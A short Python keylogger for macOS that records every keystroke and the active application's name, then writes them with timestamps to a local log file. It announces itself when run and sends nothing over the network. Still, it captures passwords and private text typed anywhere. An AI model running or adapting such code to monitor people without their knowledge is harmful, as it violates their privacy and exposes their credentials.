from pynput.keyboard import Key, Listener
import os.path
from datetime import datetime
from AppKit import NSWorkspace

keys = []
apps = []
count = 0

# Handles key press events, logging any pressed keys, 10 keys at a time
def on_press(key):
    global keys, count, app
    #print (f"{key} pressed")

    keys.append(key)
    apps.append(NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName'])
    count += 1

    if count == 10:
        write_file(keys, apps)
        count = 0
        keys.clear()
        apps.clear()


def on_release(key):
    pass

# Converts each key press into a string and appends to the output file, with spaces being converted into a new line
def write_file(keys, apps):
    # Logs each key press
    with open("out/log.txt", "a") as file:
         last_active_app = None
         nl = "\n"

         for n in range(10):
            k = str(keys[n]).replace("'", "")
            current_app = apps[n]

            if (last_active_app != current_app):
                last_active_app = current_app
                ts = datetime.now().ctime()

                file.write(nl + ts + " " + current_app + " " + k)
            elif (k != 'Key.space'):
                file.write(k)
            else:
                ts = datetime.now().ctime()

                file.write(nl + ts + " " + current_app + " ")

def initLogFile():
    # Creates out/log.txt if it doesnt already exist
    if (os.path.isfile("out/log.txt") != True):
        with open("out/log.txt", "x") as file:
            print("log.txt not found, creating file!")
            file.write("Timestamp, Current Application, Keys pressed\n")
    # else:
    #     with open("out/log.txt", "a") as file:
    #         file.write("Timestamp, Current Application, Keys pressed\n")

if __name__ == "__main__":
    initLogFile()
    
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        print("Key Logger is running\nPressing any key will append it to out/log.txt")
        listener.join()


